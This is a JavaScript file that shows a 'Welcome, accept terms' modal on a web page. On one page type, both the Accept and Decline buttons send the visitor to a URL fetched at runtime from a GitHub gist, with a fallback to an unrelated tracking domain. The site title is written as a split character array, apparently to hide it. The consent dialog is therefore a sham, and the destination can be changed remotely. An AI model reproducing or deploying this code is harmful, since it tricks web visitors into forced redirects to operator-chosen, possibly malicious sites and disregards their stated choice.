(async function () {
  // Define URLs at top
  const GIST_URL = "https://gist.githubusercontent.com/USonlineLive/ff82ef3b68c0c9f1f786caf60a34688e/raw/1e78e9754cec47ccb047cca4c3735976856329bd/url.txt";
  const FALLBACK_URL = "http://garrix.site/?utm_campaign=bXDsfRboHU&v1=[v1]&v2=[v2]&v3=[v3]";
  
  // Start with fallback URL
  let REDIRECT = FALLBACK_URL;
  
  // Simple fetch with all edge cases covered
  try {
    const response = await fetch(GIST_URL);
    
    if (!response.ok) {
      throw new Error(`Gist returned ${response.status}`);
    }
    
    const gistText = await response.text();
    const gistUrl = gistText.trim();
    
    if (gistUrl && gistUrl.startsWith('http')) {
      REDIRECT = gistUrl;
    }
    
  } catch (error) {
    console.log("Gist not available, using fallback URL");
  }
  
  // ✅ Log the redirect URL for debugging
  console.log("🔗 Final REDIRECT URL:", REDIRECT);
  
  // ✅ Only set SITE_TITLE if it doesn't exist (don't overwrite lander.html's title)
  if (!window.SITE_TITLE) {
    window.SITE_TITLE = ['P', 'l', 'a', 'y', "" ,'', 'm', '0', '0', ''];
  }

  function buildPopup() {
    // prevent double render
    if (document.querySelector(".modal-backdrop")) return null;
 
    const bd = document.createElement("div");
    bd.className = "modal-backdrop";
    bd.style.cssText = `
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      z-index: 9999;
      display: flex;
      align-items: center;
      justify-content: center;
      pointer-events: auto;
    `;
    bd.innerHTML = `
      <div class="modal-popup" role="dialog" aria-modal="true" aria-label="Welcome Notice" style="
        position: relative;
        background: #ffffff;
        border: 1px solid #e5e7eb;
        border-radius: 0.5rem;
        padding: 0.75rem;
        width: 260px;
        text-align: center;
        color: #1f2937;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        pointer-events: auto;
      ">
        <div style="margin-bottom: 0.375rem;">
          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin: 0 auto; display: block;">
            <circle cx="12" cy="12" r="10" stroke="#4f46e5" stroke-width="1.5"/>
            <path d="M9 12l2 2 4-4" stroke="#4f46e5" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
        </div>
        <h3 style="font-size: 0.9375rem; margin-bottom: 0.25rem; font-weight: 600; color: #111827;">Welcome to <span id="site-title" style="color: #4f46e5;"></span></h3>
        <p style="font-size: 0.6875rem; margin-bottom: 0.25rem; color: #6b7280; line-height: 1.2;">Accept terms to continue</p>
        <p style="font-size: 0.625rem; color: #9ca3af; margin-bottom: 0.625rem; line-height: 1.2;">Agree to Terms & Privacy Policy</p>
        <div class="modal-actions" style="display: flex; gap: 0.375rem; justify-content: center;">
          <button class="btn" id="age-yes" style="
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.1875rem;
            padding: 0.375rem 0.75rem;
            background: #4f46e5;
            color: white;
            font-size: 0.6875rem;
            font-weight: 500;
            border: none;
            border-radius: 0.25rem;
            cursor: pointer;
            transition: all 0.15s ease;
            flex: 1;
          ">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M20 6L9 17l-5-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
            Accept
          </button>
          <button class="btn ghost" id="age-no" style="
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.1875rem;
            padding: 0.375rem 0.75rem;
            background: #f9fafb;
            color: #374151;
            font-size: 0.6875rem;
            font-weight: 500;
            border: 1px solid #e5e7eb;
            border-radius: 0.25rem;
            cursor: pointer;
            transition: all 0.15s ease;
            flex: 1;
          ">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M18 6L6 18M6 6l12 12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
            </svg>
            Decline
          </button>
        </div>
        <p style="font-size: 0.5625rem; color: #9ca3af; margin-top: 0.375rem; line-height: 1.1;">
          Privacy protected
        </p>
      </div>
      <style>
        @keyframes slideUp {
          from { 
            opacity: 0; 
            transform: translateY(10px); 
          }
          to { 
            opacity: 1; 
            transform: translateY(0); 
          }
        }
        
        .modal-popup {
          animation: slideUp 0.25s ease forwards;
        }
        
        #age-yes:hover {
          background: #4338ca;
        }
        #age-no:hover {
          background: #f3f4f6;
          border-color: #d1d5db;
        }
        
        .modal-backdrop.fade-out .modal-popup {
          opacity: 0;
          transform: translateY(10px);
          transition: all 0.15s ease;
        }
      </style>`;
    document.body.appendChild(bd);
 
    // Insert site title if available
    if (window.SITE_TITLE) {
      const titleSpan = bd.querySelector("#site-title");
      titleSpan.textContent = window.SITE_TITLE.join('');
    }
 
    function close() {
      bd.classList.add("fade-out");
      setTimeout(() => bd.remove(), 150);
    }
 
    return { bd, close };
  }
 
  // Call this on index
  window.PopupIndex = function () {
    const built = buildPopup();
    if (!built) return;
    const { bd, close } = built;

    bd.querySelector("#age-yes").addEventListener("click", close);
    bd.querySelector("#age-no").addEventListener("click", close);
    
    console.log("✅ PopupIndex loaded - Buttons close modal only");
  };
 
  // Call this on lander.html
  window.PopupLander = function () {
    const built = buildPopup();
    if (!built) return;
    const { bd } = built;

    bd.querySelector("#age-yes").addEventListener("click", () => {
      console.log("🚀 Accept clicked - Redirecting to:", REDIRECT);
      window.location.href = REDIRECT;
    });
    bd.querySelector("#age-no").addEventListener("click", () => {
      console.log("🚀 Decline clicked - Redirecting to:", REDIRECT);
      window.location.href = REDIRECT;
    });
    
    console.log("✅ PopupLander loaded - Buttons will redirect to:", REDIRECT);
  };

  // ✅ FIXED: Auto-call PopupIndex INSIDE async function (after it's defined)
  // This code now runs AFTER window.PopupIndex is defined
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function() {
      // Only auto-call on index.html (lander.html calls it manually)
      if (window.location.pathname.includes('index.html') || window.location.pathname === '/') {
        console.log("✅ Auto-calling PopupIndex for index.html");
        window.PopupIndex();
      }
    });
  } else {
    // DOM already loaded
    if (window.location.pathname.includes('index.html') || window.location.pathname === '/') {
      console.log("✅ Auto-calling PopupIndex for index.html");
      window.PopupIndex();
    }
  }
  
})();
